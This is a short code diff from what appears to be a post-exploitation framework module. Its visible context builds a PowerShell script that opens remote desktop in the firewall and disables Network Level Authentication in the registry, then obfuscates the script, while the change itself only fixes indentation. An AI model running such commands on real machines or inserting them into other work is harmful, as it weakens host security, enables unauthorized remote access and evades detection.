@@ -63,8 +63,9 @@ class Module(object):
         script += " if($?) {$null = netsh firewall set service type = remotedesktop mod = enable;"
         # command to disable NLA
         script += "$null = reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f }"
-            script = helpers.keyword_obfuscation(script, self.mainMenu)
+        script = helpers.keyword_obfuscation(script, self.mainMenu)
         if obfuscate:
+
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
 
         return script
